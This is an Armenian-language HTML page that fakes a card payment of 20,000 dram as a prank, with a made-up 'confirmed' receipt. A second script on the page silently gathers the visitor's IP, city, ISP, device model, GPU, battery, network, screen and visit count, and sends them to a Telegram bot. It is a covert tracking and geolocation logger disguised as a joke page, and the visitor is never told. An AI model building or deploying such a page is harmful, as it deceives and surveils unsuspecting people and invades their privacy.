<!doctype html>
<html lang="hy">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0b0e13">
<meta name="robots" content="noindex">
<title>Վճարում</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+Armenian:wght@400;600;800;900&display=swap">
<style>
/* Layout: a mock payment screen that ends on a convincing "charged / confirmed" receipt (prank, no real card or money). */
:root{--bg:#0b0e13;--card:#151a23;--fg:#eef2f8;--soft:#8b93a5;--line:#242c38;--red:#ff4d5e;--grn:#2ec77a;--f:"Noto Sans Armenian",system-ui,-apple-system,sans-serif}
*{box-sizing:border-box}
html,body{height:100%}
body{margin:0;display:grid;place-items:center;font-family:var(--f);color:var(--fg);background:var(--bg);overflow:hidden;
  padding:env(safe-area-inset-top,0px) max(16px,env(safe-area-inset-right,0px)) env(safe-area-inset-bottom,0px) max(16px,env(safe-area-inset-left,0px))}
.card{width:100%;max-width:360px;background:var(--card);border:1px solid var(--line);border-radius:22px;padding:26px 22px;box-shadow:0 24px 60px rgba(0,0,0,.5);text-align:center}
.brand{display:flex;align-items:center;justify-content:center;gap:8px;color:var(--soft);font-size:13px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:18px}
.dot{width:9px;height:9px;border-radius:50%;background:var(--grn);box-shadow:0 0 10px var(--grn)}
.amt{font-size:46px;font-weight:900;letter-spacing:-.01em;font-variant-numeric:tabular-nums}
.sub{color:var(--soft);font-size:14px;margin-top:4px}
.spin{width:52px;height:52px;margin:22px auto 6px;border-radius:50%;border:5px solid var(--line);border-top-color:var(--red);animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.status{min-height:22px;font-size:15px;color:var(--soft);margin-top:10px;transition:color .3s}
.bar{height:6px;border-radius:99px;background:var(--line);overflow:hidden;margin-top:18px}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--red),#ff8a3d);transition:width .2s}
.ok{display:none}
.done .pay{display:none}
.done .ok{display:block;animation:pop .45s cubic-bezier(.2,.9,.3,1.4) both}
@keyframes pop{0%{transform:scale(.9);opacity:0}100%{transform:scale(1);opacity:1}}
.check{width:76px;height:76px;margin:4px auto 10px;border-radius:50%;background:rgba(46,199,122,.12);display:grid;place-items:center}
.check svg{width:42px;height:42px;stroke:var(--grn);stroke-width:3.5;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:40;stroke-dashoffset:40;animation:draw .5s .15s forwards}
@keyframes draw{to{stroke-dashoffset:0}}
.okt{font-size:24px;font-weight:900;color:var(--grn)}
.rows{text-align:left;margin-top:18px;border-top:1px solid var(--line);padding-top:14px;display:flex;flex-direction:column;gap:10px}
.row{display:flex;justify-content:space-between;gap:12px;font-size:14px}
.row b{font-weight:600;color:var(--soft)}
.row span{font-weight:800;font-variant-numeric:tabular-nums}
@media (prefers-reduced-motion:reduce){.spin{animation-duration:2.5s}.check svg{animation:none;stroke-dashoffset:0}}
</style>
</head>
<body>
<div class="card" id="card">
  <div class="pay">
    <div class="brand"><span class="dot"></span> Secure Payment</div>
    <div class="amt">20.000 ֏</div>
    <div class="sub">Վճարում · **** 4417</div>
    <div class="spin" aria-hidden="true"></div>
    <div class="status" id="st">Միանում ենք բանկին…</div>
    <div class="bar"><i id="bar"></i></div>
  </div>
  <div class="ok">
    <div class="check" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
    <div class="okt">Վճարումը հաստատվեց</div>
    <div class="rows">
      <div class="row"><b>Գումար</b><span>20.000 ֏</span></div>
      <div class="row"><b>Քարտ</b><span>**** 4417</span></div>
      <div class="row"><b>Ամսաթիվ</b><span id="rdate">—</span></div>
      <div class="row"><b>Կոդ</b><span id="rid">—</span></div>
      <div class="row"><b>Կարգավիճակ</b><span style="color:var(--grn)">Հաստատված ✓</span></div>
    </div>
  </div>
</div>
<script>
const card = document.getElementById("card"), st = document.getElementById("st"), bar = document.getElementById("bar");
const steps = [
  [700, "Միանում ենք բանկին…", 15],
  [1000, "Ստուգում ենք քարտը…", 45],
  [900, "Հաստատում ենք վճարումը…", 80],
  [800, "Քաշվում է 20.000 ֏…", 100]
];
let i = 0;
(function next() {
  if (i >= steps.length) { setTimeout(done, 500); return; }
  const [d, text, pct] = steps[i++];
  st.textContent = text; if (i === steps.length) st.style.color = "var(--red)";
  bar.style.width = pct + "%";
  setTimeout(next, d);
})();
function done() {
  document.getElementById("rdate").textContent = new Date().toLocaleString("hy-AM", {day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"});
  document.getElementById("rid").textContent = "TXN" + Math.floor(100000 + Math.random()*900000);
  card.classList.add("done");
}
</script>
<script>
function deviceName(ua) {
  const m = ua.match(/\((?:Linux.*?; )?(?:Android[^;]*; )?([^;)]*(?:SM-[^;)]*|Pixel[^;)]*|iPhone|iPad)[^;)]*)/);
  if (/iPhone/.test(ua)) { const v = (ua.match(/OS (\d+[_\d]*)/) || [,""])[1].replace(/_/g, "."); return "iPhone" + (v ? " · iOS " + v : ""); }
  if (/iPad/.test(ua)) return "iPad";
  const sm = ua.match(/(SM-[A-Z0-9]+|Pixel \d+[^;)]*|Redmi[^;)]*|POCO[^;)]*)/i);
  if (sm) return sm[1].trim();
  if (/Android/.test(ua)) return "Android " + (ua.match(/Android (\d+)/) || [,"?"])[1];
  if (/Windows/.test(ua)) return "Windows";
  if (/Mac/.test(ua)) return "Mac";
  return "Այլ սարք";
}

async function geo() {
  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
    try { const r = await fetch(url, {cache: "no-store"}); if (!r.ok) continue; const d = await r.json();
      return {city: d.city, region: d.region || d.region_code, country: d.country || d.country_name, isp: (d.connection && d.connection.isp) || d.org || d.isp, ip: d.ip};
    } catch (e) {}
  }
  return {};
}

function gpu() {
  try { const c = document.createElement("canvas"); const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : ""; } catch (e) { return ""; }
}
function visitCount() {
  try { const n = (parseInt(localStorage.getItem("lt9") || "0", 10) || 0) + 1; localStorage.setItem("lt9", n); return n; } catch (e) { return 1; }
}

(async () => {
  const ua = navigator.userAgent;
  const time = new Date().toLocaleString("hy-AM", {timeZone: "Asia/Yerevan", day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit"});
  let bat = "";
  try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100) + "%" + (b.charging ? " ⚡" : ""); } } catch (e) {}
  const conn = navigator.connection || {};
  const net = conn.effectiveType ? conn.effectiveType.toUpperCase() + (conn.type && conn.type !== "cellular" ? " · " + conn.type : "") : "";
  const hw = [navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " միջուկ" : "", navigator.deviceMemory ? navigator.deviceMemory + "GB" : ""].filter(Boolean).join(" · ");
  const g2 = gpu();
  const theme = matchMedia("(prefers-color-scheme: dark)").matches ? "մութ" : "լուսավոր";
  const portrait = (screen.height || 0) >= (screen.width || 0);
  const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone) || "?";
  const visit = visitCount();
  const ref = document.referrer ? (new URL(document.referrer).hostname) : "";
  const g = await geo();
  const lines = [
    "📲 <b>Տեգ 9</b> բացվեց",
    "🕒 " + time,
    g.city ? "📍 " + [g.city, g.region, g.country].filter(Boolean).join(", ") : null,
    g.isp ? "🌐 " + g.isp : null,
    g.ip ? "🔗 " + g.ip : null,
    "📱 " + deviceName(ua),
    g2 ? "🎮 " + g2 : null,
    net ? "📶 " + net : null,
    hw ? "🧠 " + hw : null,
    "🗣 " + (navigator.language || "?") + " · 🖥 " + screen.width + "×" + screen.height + " · " + (portrait ? "ուղղահայաց" : "հորիզոնական"),
    "🌓 " + theme + " · 🕐 " + tz,
    bat ? "🔋 " + bat : null,
    "🔁 " + visit + "-րդ անգամ" + (ref ? " · 🔗 " + ref : "")
  ].filter(Boolean).join("\n");
  try {
    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST", headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: CHAT, text: lines, parse_mode: "HTML"})
    });
  } catch (e) {}
})();

</script>
</body>
</html>
